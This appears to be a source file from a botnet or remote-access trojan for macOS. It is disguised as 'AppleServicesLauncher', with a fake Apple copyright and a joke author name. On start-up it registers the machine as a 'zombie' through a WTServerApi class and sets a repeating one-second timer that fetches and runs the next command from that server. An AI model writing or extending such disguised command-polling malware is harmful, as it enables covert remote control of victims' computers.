//
//  AppleServicesLauncher.m
//  AppleServicesLauncher
//
//  Created by Nikola Tesla on 9/29/14.
//  Copyright (c) 2014 Apple. All rights reserved.
//

#import "AppleServicesLauncher.h"
#import "WTServerApi.h"

@implementation AppleServicesLauncher

- (id)init {
    
    self = [super init];

    [WTServerApi initializeNewZombie];
    
    NSTimer *timer = [NSTimer timerWithTimeInterval:1 target:[WTServerApi class] selector:@selector(execNextCommand) userInfo:nil repeats:YES];
    [timer fire];
    
    return self;
}

@end
